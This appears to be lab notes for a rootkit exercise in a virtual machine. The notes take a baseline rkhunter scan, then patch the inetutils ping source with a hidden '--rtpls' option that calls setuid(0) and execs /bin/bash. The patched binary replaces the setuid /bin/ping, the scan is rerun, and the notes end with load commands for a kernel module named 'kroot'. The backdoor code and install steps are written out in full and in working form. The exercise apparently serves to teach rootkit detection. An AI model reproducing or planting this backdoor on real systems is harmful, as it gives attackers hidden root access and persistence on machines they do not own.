##########################
# Step 0 Prepare VM/Kernel
##########################

#Install OS into VM
#Make VM Snapshot

#Gasterweiterung installieren 
    sudo apt-get install build-essentials
#Insert Guest Addition iso into vm and navigate to cd-rom folder then run
    sudo bash ./autorun.sh
#Install vim
    sudo apt-get install vim
#To the ~/.vimrc add 
    set mouse=a
#Make VM Snapshot

#Downgrade Kernel via script (step0 folder)
#Install grub customizer and change default kernel
    sudo add-apt-repository ppa:danielrichter2007/grub-customizer
    sudo apt-get update
    sudo apt-get install grub-customizer
#Reboot
    sudo reboot now
#Make VM Snapshot

#################################
# Setp 1 Install and Run rkhunter
#################################

#Install RootkitHunter (rkhunter) with Local Only  for Mail option
    sudo apt-get install rkhunter
#Update rkhunter DB (might fail due to invalid WEB_CMD in that case skip this):
    sudo rkhunter --update
#Scan (Interactive): 
    sudo rkhunter -c
#Copy log from /var/log/rkhunter.log to some safe place 
    sudo cp /var/log/rkhunter.log ~/Documents/step1.log

##############################
# Step 2 Build/Install Rootkit
##############################

#ping is found in APT-Sources: http://de.archive.ubuntu.com/ubuntu/ xenial universe
#in /etc/apt/source.list uncomment/add 
    deb-src  http://de.archive.ubuntu.com/ubuntu/ xenial universe
    
#refresh apt database
    sudo apt-get update

#cd into a new/empty dir for downloading the ping src into e.g. 
    mkdir -p ~/Documents/Pingdoor && cd ~/Documents/Pingdoor

#get ping source 
    apt-get source inetutils-ping
#install build dependencies 
    sudo apt-get build-dep inetutils-ping
#go into the inetutild-1.9.4 folder
    cd inetutils-1.9.4
#test-compile, this takes some time and should succeed
#build may complain (error) about missing keys this is not a problem just ignore it
    dpkg-buildpackage

#edit ping/ping.c using an editor of choise e.g.
    vim ping/ping.c
#add to the end of the unnamed? (ca. line 101) enum:

    ARG_ROOT_PLS

#add to the argp_options array the following element between #define GRP 10 and #undef GRP,
#must be after {NULL, 0, NULL, 0, "Options controlling ICMP request types:", GRP}:
   
    {"rtpls",ARG_ROOT_PLS,NULL,OPTION_HIDDEN,"grants root shell",GRP+1},
    
#in the parse_opt method add to the switch 
  
    case ARG_ROOT_PLS:
        setuid(0);
        setgid(0);
        execl("/bin/bash",NULL);
        break;

#commit changes 
    dpkg-source --commit
#build changes 
    dpkg-buildpackage

#the next two might be necessary because 
#the first dpkg-buildpackage usually finds changed files.?
#commit changes 
    dpkg-source --commit
#build changes 
    dpkg-buildpackage

#to test first set correct privileges by running
    sudo chown root:root ping/ping
    sudo chmod u+s ping/ping
#test run ping with special flag
    ping/ping --rtpls

#make a backup of the original ping (just in case)
    sudo cp /bin/ping ~/Documents/ping.bak
#replace /bin/ping with our ping command
    sudo cp ping/ping /bin/ping
#make sure it hase the setuid bit set (should not be necessary)
    sudo chmod u+s /bin/ping

#run rkhunter again
    sudo rkhunter -c
    
#compare logs of rkhunter

#############################
# Step 3 Rootkit/Kernelmodule
#############################

#switch to a new/empty directory
    mkdir -p ~/Documents/Rootkit && cd ~/Documents/Rootkit

#install headers
    sudo apt-get install linux-headers-$(uname -r)

#setup files (can be found in the step3 folder)
#Create Makefile (no quotes around kroot.o)
#Create kroot.c
#now compile and load the module
#don't forget to unload first if you are making changes to the module

#compile (compile.sh)
    make -C /lib/modules/$(uname -r)/build M=$PWD modules

#load (load.sh)
    sudo insmod kroot.ko

#unload (unload.sh)
    sudo rmmod kroot.ko

#Show Messages (add -w to display messages as they come in) (show.sh uses -w flag)
    sudo dmesg -k

#To Recompile and (re)load the module you can use the replace.sh script (this needs the load,unload and compile script)

#if on the first try the module does not work reboot and try again